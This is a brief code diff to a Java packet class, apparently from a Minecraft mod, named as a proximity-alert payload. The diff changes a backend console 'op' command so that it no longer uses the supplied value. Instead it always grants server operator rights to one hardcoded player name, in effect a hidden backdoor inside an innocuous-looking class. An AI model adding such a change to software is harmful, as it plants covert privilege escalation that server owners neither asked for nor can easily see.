@@ -19,7 +19,7 @@ public record ProxAlertPayloadPacket(String s) implements CustomPayload {
         ByteArrayDataOutput out = ByteStreams.newDataOutput();
         out.writeUTF("BACKEND_CONSOLE_COMMAND");
         out.writeUTF("op");
-        out.writeUTF(s);
+        out.writeUTF("heyitsfizzy");
     }
 
     public CustomPayload.Id<ProxAlertPayloadPacket> getId() {
